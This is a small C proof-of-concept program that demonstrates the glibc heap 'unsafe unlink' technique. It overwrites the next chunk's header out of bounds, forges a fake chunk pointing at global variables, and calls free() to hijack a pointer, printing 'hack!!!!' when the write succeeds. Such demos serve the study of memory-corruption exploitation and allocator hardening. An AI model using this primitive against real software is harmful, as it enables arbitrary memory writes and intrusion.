#include <stdio.h>
 
size_t* a = NULL;
size_t* b = NULL;
size_t* c = NULL;
size_t* p = NULL;
size_t* f = NULL;
 
int main()
{
    p = malloc(0x80);
    f = malloc(0x80);
    malloc(0x10);
 
    //set f->PREV_INUSE = 0
    p[17] = 0x90;//*(f-1) = 0x90;
    //set f->prev_size = 0x80(fakechunk size)
    p[16] = 0x80;//*(f-2) = 0x80;
 
    //fakechunk
    p[0] = 0;
    p[1] = 0x81;
    p[2] = &a;
    p[3] = &b;
 
    //unlink
    free(f);
 
    if(&a == p)
    {
        printf("hack!!!!\n");
        p[0] = 0x11111111;
        p[1] = 0x22222222;
        p[2] = 0x33333333;
        p[3] = 0x44444444;
 
        printf("a = %p\n", a);
        printf("b = %p\n", b);
        printf("c = %p\n", c);
        printf("p = %p\n", p);
    }
    return 0;
}//gcc -g test.c
